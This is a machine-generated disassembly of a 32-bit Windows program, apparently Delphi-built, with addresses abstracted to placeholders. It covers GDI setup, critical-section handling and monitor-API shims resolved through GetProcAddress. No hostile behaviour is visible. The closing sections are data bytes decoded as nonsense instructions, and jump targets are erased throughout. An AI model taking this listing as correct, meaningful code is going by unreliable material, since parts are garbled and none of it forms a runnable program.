call sub_4162b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4240dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42416a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_416050
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41627c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41627c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_424194
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41e518
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42416f
mov eax [ ebp - 0x4 ]
call sub_403344
call sub_403af8
call sub_403b4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424194
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4241d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_421a50
mov eax [ ebx + 0x28 ]
call sub_421a54
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_424028
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_4162b4
pop esi
pop ebx
retn
sub_4242a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4242e5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_420264
mov ecx esi
mov edx ebx
call sub_41fec8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242ec
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4242f4
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41eb6c
mov [ rw-data ] eax
pop ebx
retn
sub_42432c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_424370
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call sub_4062e4
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42432c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call sub_4062e4
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42443c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_424474
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_42466c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4244b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4244a0
xor eax eax
push ebp
push sub_424559
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424560
mov eax [ ebp - 0x4 ]
call sub_4244ac
retn
mov eax 0x10
call sub_4026f4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42456c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42456c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42464b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_422ac0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41dae4
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41d9c8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412f04
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41dda0
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41e1c8
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42277c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42466c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4244a0
xor eax eax
push ebp
push sub_4246b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246be
mov eax [ ebp - 0x4 ]
call sub_4244ac
retn
mov esp ebp
pop ebp
retn
sub_4246be
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402714
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403344
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4244a0
xor eax eax
push ebp
push sub_4246b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246be
mov eax [ ebp - 0x4 ]
call sub_4244ac
retn
mov esp ebp
pop ebp
retn
sub_4246e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41cd14
push eax
mov eax ebx
call sub_41cd14
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_4244b8
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42471c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4247e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4247ec
retn
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
call sub_421734
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404b1c
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404b1c
sub_4247f0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4242f4
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_424370
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4cc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4cc
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4cc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42443c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41460c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41460c
mov [ rw-data ] eax
mov ecx sub_41cd24
mov edx sub_41cd34
mov eax [ r-xdata ]
call sub_413d34
mov ecx r-xdata
mov edx sub_41cf3c
mov eax [ r-xdata ]
call sub_413d34
sub_4248fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424921
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424928
retn
sub_424ad8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_424b14
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov [ esi + 0x10 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_424b90
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_414608
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403344
sub_424cbc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4141f0
mov eax [ esi + 0x14 ]
call sub_403344
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_424d24
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax ebx
sub al 0x1
jb r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419db0
mov ebp eax
mov [ edi + 0x14 ] ebp
mov [ ebp + 0x34 ] edi
mov [ ebp + 0x30 ] sub_424d14
test esi esi
je r-xdata
sub al 0x2
jb r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_424b90
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x14 ]
mov eax esi
call sub_419e80
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x14 ]
mov eax esi
call sub_41a0b0
sub_424dac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_424df0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_424e34
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41425c
mov eax esi
pop esi
pop ebx
retn
sub_424e60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424e85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e8c
retn
sub_424f5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424f81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f88
retn
sub_424f94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_425053
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42505a
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_424f94
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404094
sub_42507c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_424f94
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_425104
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_424f94
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_425194
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_424f94
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_425104
sub_42522a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_424f94
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4252ab
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_424f94
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425398
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_424f94
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42546c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_424f94
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425540
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_424f94
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4256db
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_425701
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425708
retn
sub_42571c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425741
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425748
retn
sub_42583c
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
lea eax [ eax ]
cld
pop eax
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x58fc0040 ]
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
push esi
je r-xdata
jb r-xdata
push edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ edx + esi * 2 ] dl
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
pop eax
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42587cc0 ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4264e7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0x6000408d
pop ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x59 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x59 ] dh
inc edx
add [ eax + eax ] cl
add [ eax ] al
enter 0x4010 0x0
insb
je r-xdata
add [ edi ] cl
outsb
je r-xdata
pop eax
inc edx
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
popad
outsb
popad
jb r-xdata
add al al
dec edi
